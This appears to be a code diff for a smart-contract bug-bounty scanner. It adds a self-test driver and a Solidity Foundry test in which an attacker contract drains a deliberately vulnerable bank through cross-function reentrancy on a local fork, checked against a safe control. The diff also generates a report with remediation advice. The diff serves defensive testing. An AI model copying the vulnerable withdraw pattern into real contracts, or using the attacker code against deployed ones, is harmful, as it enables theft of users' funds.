@@ -677,3 +677,130 @@ def run_spot_self_test(rpc_url: str, out_dir: Path, workdir: Path | None = None)
         pass
     return {"green": green, "vuln_confirmed": vuln_confirmed, "safe_discarded": safe_discarded,
             "vuln_profit_wei": vuln["profit_wei"], "safe_profit_wei": safe["profit_wei"], "report_path": report_path}
+
+
+# =====================================================================================================
+# Generic bidirectional self-test driver for the remaining patterns. Runs a vulnerable + safe controlled
+# target through generator -> fork -> profit-gate, writes an Immunefi-style report (only when the
+# vulnerable target confirms) + appends to the README. 'green' iff vuln confirms AND safe discards.
+def _pattern_selftest(rpc_url, out_dir, label, subdir, test_re, build_fn, title, desc, reco):
+    forge = forge_bin()
+    if not forge or not rpc_url:
+        return {"green": False, "error": "forge or rpc unavailable"}
+    proj = Path(Path.home() / ".bountyscan_forge" / "chain")
+    (proj / "foundry.toml").write_text('[profile.default]\nsrc="src"\ntest="test"\nlibs=["lib"]\n', encoding="utf-8")
+    if not _ensure_forge_std(proj, forge):
+        return {"green": False, "error": "forge-std unavailable"}
+    vuln = _run_pattern(forge, proj, rpc_url, subdir, "Vuln", test_re, build_fn(True))
+    safe = _run_pattern(forge, proj, rpc_url, subdir, "Safe", test_re, build_fn(False))
+    vc = vuln["passed"] and vuln["profit_wei"] > 0
+    sd = (not safe["passed"]) and safe["profit_wei"] <= 0
+    green = vc and sd
+    out_dir.mkdir(parents=True, exist_ok=True)
+    ts = time.strftime("%Y%m%d-%H%M%S", time.gmtime())
+    report_path = ""
+    if vc:
+        trace = "\n".join(l for l in vuln["out"].splitlines()
+                          if re.search(r"PASS|FAIL|CHAIN_PROFIT|Suite result", l))[:1200]
+        md = ("> **Harness self-test — controlled target, not a historical reproduction.**\n\n"
+              f"# {title}\n\n"
+              "**Chain:** ethereum (fork)  ·  **Contract:** (controlled target, deployed on the fork)  ·  **Verdict:** CONFIRMED\n\n"
+              f"## Description\n{desc} Proven on a fork: the attacker netted **{vuln['profit_wei']} wei**.\n\n"
+              "## Proof of Concept\n"
+              f"Foundry test (local fork, `require(block.chainid == 1)`, never broadcast): `{vuln['test_path']}`\n```\n{trace}\n```\n"
+              f"Negative control (same template, safe variant): profit {safe['profit_wei']} wei → **discarded**.\n\n"
+              f"## Recommendation\n{reco}\n")
+        report_path = str(out_dir / f"self_test_{label}_{ts}.md")
+        Path(report_path).write_text(md, encoding="utf-8")
+    readme = out_dir / "SELFTEST_README.md"
+    extra = (f"\n\n## {title} ({ts} UTC) — {'GREEN (both directions)' if green else 'NOT GREEN'}\n"
+             f"| Target | Expected | Result |\n|---|---|---|\n"
+             f"| vulnerable | CONFIRMED | {'PASS, +' + str(vuln['profit_wei']) + ' wei' if vc else 'unexpected: ' + str(vuln['profit_wei'])} |\n"
+             f"| safe control | DISCARDED | {'discarded (' + str(safe['profit_wei']) + ')' if sd else 'unexpected: ' + str(safe['profit_wei'])} |\n")
+    try:
+        readme.write_text((readme.read_text(encoding="utf-8") if readme.exists() else "# Chain-exploit self-tests") + extra, encoding="utf-8")
+    except OSError:
+        pass
+    return {"green": green, "vuln_confirmed": vc, "safe_discarded": sd,
+            "vuln_profit_wei": vuln["profit_wei"], "safe_profit_wei": safe["profit_wei"], "report_path": report_path}
+
+
+# ---- #5 Cross-function reentrancy (SC08) ----
+_XFN_SELFTEST = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {Test, console2} from "forge-std/Test.sol";
+
+contract Bank {
+    mapping(address => uint256) public balances;
+    bool public immutable safeCEI;                     // true = effect-before-interaction (safe)
+    constructor(bool s) { safeCEI = s; }
+    function deposit() external payable { balances[msg.sender] += msg.value; }
+    function withdraw() external {                     // function A
+        uint256 bal = balances[msg.sender];
+        if (bal == 0) return;
+        if (safeCEI) balances[msg.sender] = 0;         // safe: settle before the call
+        (bool ok, ) = msg.sender.call{value: bal}("");
+        require(ok, "send");
+        if (!safeCEI) balances[msg.sender] = 0;        // vuln: settle AFTER the call
+    }
+    function transfer(address to, uint256 amt) external {  // function B reads the (stale) balance
+        require(balances[msg.sender] >= amt, "bal");
+        balances[msg.sender] -= amt; balances[to] += amt;
+    }
+    receive() external payable {}
+}
+contract Helper {
+    Bank public bank;
+    constructor(Bank b) { bank = b; }
+    function cashout() external { bank.withdraw(); }
+    receive() external payable {}
+}
+contract Attacker {
+    Bank public bank; Helper public helper;
+    constructor(Bank b) { bank = b; helper = new Helper(b); }
+    function run() external {
+        uint256 s = address(this).balance;
+        bank.deposit{value: s}();
+        bank.withdraw();                               // A sends ETH back -> receive() re-enters B
+        helper.cashout();                              // helper withdraws the balance B moved to it
+    }
+    receive() external payable {
+        uint256 b = bank.balances(address(this));      // B: move the not-yet-settled balance to the helper
+        if (b > 0) bank.transfer(address(helper), b);
+    }
+}
+contract PoC is Test {
+    uint256 constant EXPECTED_CHAINID = 1;
+    function setUp() public { require(block.chainid == EXPECTED_CHAINID, "fork guard"); }
+    function test_cross_function_reentrancy() public {
+        Bank bank = new Bank(__SAFE__);
+        address victim = address(0xBEEF);
+        vm.deal(victim, 10 ether); vm.prank(victim); bank.deposit{value: 10 ether}();
+        Attacker att = new Attacker(bank);
+        vm.deal(address(att), 1 ether);
+        Helper h = att.helper();
+        uint256 bef = address(att).balance + address(h).balance;
+        att.run();
+        uint256 aft = address(att).balance + address(h).balance;
+        console2.log("CHAIN_PROFIT_WEI", int256(aft) - int256(bef));
+        assertGt(aft, bef, "no profit: cross-function reentrancy did not extract funds");
+    }
+}
+"""
+
+
+def build_cross_reentrancy_selftest_sol(vulnerable: bool) -> str:
+    """Cross-function reentrancy: vulnerable (settle AFTER call) or safe (CEI, settle before call)."""
+    return _XFN_SELFTEST.replace("__SAFE__", "false" if vulnerable else "true")
+
+
+def run_cross_reentrancy_self_test(rpc_url: str, out_dir: Path) -> dict:
+    return _pattern_selftest(
+        rpc_url, out_dir, "xfn_reentrancy", "selftestxfn", "test_cross_function_reentrancy",
+        build_cross_reentrancy_selftest_sol,
+        "Cross-function reentrancy extracts funds via stale shared state",
+        "withdraw() (A) sends ETH before settling the caller's balance; during the callback the attacker "
+        "re-enters transfer() (B), which reads the not-yet-zeroed balance and moves it to an accomplice. "
+        "The attacker receives the ETH AND keeps the credited balance, double-spending the deposit.",
+        "Apply checks-effects-interactions in A (settle before the external call) and/or guard every "
+        "function touching the shared balance with the SAME nonReentrant lock.")
